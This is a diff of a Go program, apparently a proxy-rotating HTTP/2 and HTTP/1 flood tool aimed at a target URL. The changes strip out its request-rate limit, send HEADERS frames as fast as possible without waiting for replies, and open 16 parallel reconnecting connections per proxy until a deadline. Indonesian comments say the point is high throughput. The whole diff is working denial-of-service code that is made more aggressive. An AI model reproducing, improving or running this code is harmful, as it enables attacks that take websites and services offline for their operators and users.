@@ -533,19 +533,19 @@ func runSessionH1(conn net.Conn, u *url.URL, deadline time.Time) {
 
 // ── HTTP/2 session — send raw HEADERS frames ──────────────────────────────────
 
-func runSession(conn net.Conn, u *url.URL, rps int, deadline time.Time) {
+func runSession(conn net.Conn, u *url.URL, deadline time.Time) {
 	defer conn.Close()
 
-	// 1. send client connection preface
+	// client preface
 	var preface []byte
 	preface = append(preface, []byte(h2Preface)...)
-	preface = append(preface, h2Frame(0, 0x4, 0, settingsPayload())...)        // SETTINGS
-	preface = append(preface, h2Frame(0, 0x8, 0, winUpdatePayload(15663105))...) // WINDOW_UPDATE
+	preface = append(preface, h2Frame(0, 0x4, 0, settingsPayload())...)
+	preface = append(preface, h2Frame(0, 0x8, 0, winUpdatePayload(15663105))...)
 	if _, err := conn.Write(preface); err != nil {
 		return
 	}
 
-	// 2. reader — drain server frames & reply
+	// reader — drain server frames, reply SETTINGS/PING, count status
 	go func() {
 		br := bufio.NewReaderSize(conn, 64*1024)
 		hdr := make([]byte, 9)
@@ -564,16 +564,16 @@ func runSession(conn net.Conn, u *url.URL, rps int, deadline time.Time) {
 				}
 			}
 			switch ftype {
-			case 0x4: // SETTINGS
+			case 0x4:
 				if flags&0x1 == 0 {
-					conn.Write(h2Frame(0, 0x4, 0x1, nil)) // ACK
+					conn.Write(h2Frame(0, 0x4, 0x1, nil))
 				}
-			case 0x6: // PING
-				conn.Write(h2Frame(0, 0x6, 0x1, payload)) // PONG
-			case 0x7: // GOAWAY
+			case 0x6:
+				conn.Write(h2Frame(0, 0x6, 0x1, payload))
+			case 0x7:
 				conn.Close()
 				return
-			case 0x1: // HEADERS — read status
+			case 0x1:
 				hdrs, err := dec.DecodeFull(payload)
 				if err != nil {
 					continue
@@ -592,12 +592,8 @@ func runSession(conn net.Conn, u *url.URL, rps int, deadline time.Time) {
 		}
 	}()
 
-	// 3. writer — send HEADERS frames as fast as rps allows
-	var interval time.Duration
-	if rps > 0 {
-		interval = time.Second / time.Duration(rps)
-	}
-
+	// writer — kirim frames secepat mungkin, tanpa tunggu response
+	// ini yang bikin throughput tinggi: pipeline semua stream sekaligus
 	streamID := uint32(1)
 	var hpackBuf bytes.Buffer
 	enc := hpack.NewEncoder(&hpackBuf)
@@ -639,15 +635,9 @@ func runSession(conn net.Conn, u *url.URL, rps int, deadline time.Time) {
 			enc.WriteField(field)
 		}
 
-		// HEADERS frame flags: END_STREAM(0x1) | END_HEADERS(0x4) | PRIORITY(0x20)
-		// priority block prefix: 5 bytes (exclusive+stream_dep 4b + weight 1b)
 		encoded := hpackBuf.Bytes()
 		payload := make([]byte, 5+len(encoded))
-		// exclusive bit set, dep stream 0, weight 255
 		payload[0] = 0x80
-		payload[1] = 0x00
-		payload[2] = 0x00
-		payload[3] = 0x00
 		payload[4] = 0xFF
 		copy(payload[5:], encoded)
 
@@ -658,38 +648,43 @@ func runSession(conn net.Conn, u *url.URL, rps int, deadline time.Time) {
 		atomic.AddInt64(&statReq, 1)
 		streamID += 2
 		if streamID > 0x7FFFFFFF {
-			// stream IDs exhausted, close and reconnect
 			return
-		}
-
-		if interval > 0 {
-			time.Sleep(interval)
 		}
 	}
 }
 
-// ── worker — 1 goroutine per proxy, loop terus tanpa antri ───────────────────
+// ── worker — 1 goroutine per proxy, buka BANYAK koneksi paralel ──────────────
 
-// workerForProxy: 1 proxy dedicated, buka koneksi terus sampai deadline
+// connsPerProxy: berapa koneksi simultan per proxy
+const connsPerProxy = 16
+
 func workerForProxy(px Proxy, u *url.URL, port int, deadline time.Time, wg *sync.WaitGroup) {
 	defer wg.Done()
-	for time.Now().Before(deadline) {
-		conn, proto, err := dialMix(px, u.Hostname(), port)
-		if err != nil {
-			atomic.AddInt64(&statProxyErr, 1)
-			time.Sleep(500 * time.Millisecond)
-			continue
-		}
-		atomic.AddInt64(&statProxyOK, 1)
 
-		if proto == "h2" {
-			atomic.AddInt64(&statH2, 1)
-			runSession(conn, u, 0, deadline)
-		} else {
-			atomic.AddInt64(&statH1, 1)
-			runSessionH1(conn, u, deadline)
-		}
+	var inner sync.WaitGroup
+	for i := 0; i < connsPerProxy; i++ {
+		inner.Add(1)
+		go func() {
+			defer inner.Done()
+			for time.Now().Before(deadline) {
+				conn, proto, err := dialMix(px, u.Hostname(), port)
+				if err != nil {
+					atomic.AddInt64(&statProxyErr, 1)
+					time.Sleep(300 * time.Millisecond)
+					continue
+				}
+				atomic.AddInt64(&statProxyOK, 1)
+				if proto == "h2" {
+					atomic.AddInt64(&statH2, 1)
+					runSession(conn, u, deadline)
+				} else {
+					atomic.AddInt64(&statH1, 1)
+					runSessionH1(conn, u, deadline)
+				}
+			}
+		}()
 	}
+	inner.Wait()
 }
 
 // ── main ──────────────────────────────────────────────────────────────────────
